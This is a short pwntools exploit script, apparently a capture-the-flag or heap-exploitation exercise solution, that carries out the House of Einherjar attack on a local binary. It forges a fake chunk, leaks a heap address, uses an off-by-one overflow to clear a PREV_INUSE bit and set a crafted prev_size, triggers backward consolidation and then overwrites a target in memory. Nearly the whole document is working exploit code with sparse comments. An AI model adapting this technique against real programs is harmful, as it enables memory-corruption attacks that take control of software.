from pwn import *

r = process("./house_of_einherjar")

def malloc(size):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"size:",str(size).encode())
def free(idx):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"index:",str(idx).encode())
def edit(idx,data):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"index:",str(idx).encode())
    r.sendafter(b"data:",data)

# Create fake chunk A
fake_chunk = p64(0) + p64(0) + p64(0x602010)*2
r.sendafter(b"username:",fake_chunk)

# chunksize (p) != prev_size (next_chunk (p)))

# Leak heap address
r.recvuntil(b"@ ")
heap = int(r.recv(10),16)

# Alloc B and C
# malloc alignment allocs a 0x90 chunk with 0x10 bytes for metadata
# and only 0x80 bytes for data, we can overflow C->prev_size
malloc(0x88)
malloc(0xf8)

fake_size = (heap + 0x90) - 0x602010

# Overflow C with B
# It adds a null byte to C->size and unset it's PREV_INUSE bit
edit(0,b"A"*0x80 + p64(fake_size))

# Call unlink_chunk, consolidating A and C
free(1)

# av->top = 0x602010 (user)

# Allocate a new chunk and overwrite target
malloc(0x100)
edit(2,p64(0) * 2 + b"_s1s1fo_")

r.interactive()
